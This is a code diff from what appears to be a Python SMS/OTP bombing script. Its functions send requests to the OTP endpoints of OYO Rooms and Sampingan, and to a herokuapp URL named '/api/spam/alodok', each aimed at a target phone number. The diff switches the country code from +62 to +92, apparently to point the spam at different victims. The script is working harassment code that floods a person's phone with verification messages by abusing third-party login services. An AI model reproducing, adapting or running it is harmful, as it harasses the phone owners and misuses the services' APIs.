@@ -85,7 +85,7 @@ def oyo():
     "referer": "https://www.oyorooms.com/login",
     "Accept-Encoding": "gzip, deflate, br",
     }
-    dat=json.dumps({"phone":c,"country_code":"+62","country_iso_code":"ID","nod":"4","send_otp":"true","devise_role":"Consumer_Guest"})
+    dat=json.dumps({"phone":c,"country_code":"+92","country_iso_code":"ID","nod":"4","send_otp":"true","devise_role":"Consumer_Guest"})
     r = requests.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id", data=dat, headers=ua).text
 def depop():
     ua={
@@ -135,7 +135,7 @@ def call2():
     "Accept-Encoding": "gzip",
     "User-Agent": "okhttp/4.4.0"
     }
-    dat=json.dumps({"countryCode":"+62","phoneNumber":c})
+    dat=json.dumps({"countryCode":"+92","phoneNumber":c})
     r=requests.post("https://srv3.sampingan.co.id/auth/generate-otp", data=dat, headers=ua)
 def alodoc():
     req=requests.post("https://nuubi.herokuapp.com/api/spam/alodok", data={"number":no}).text
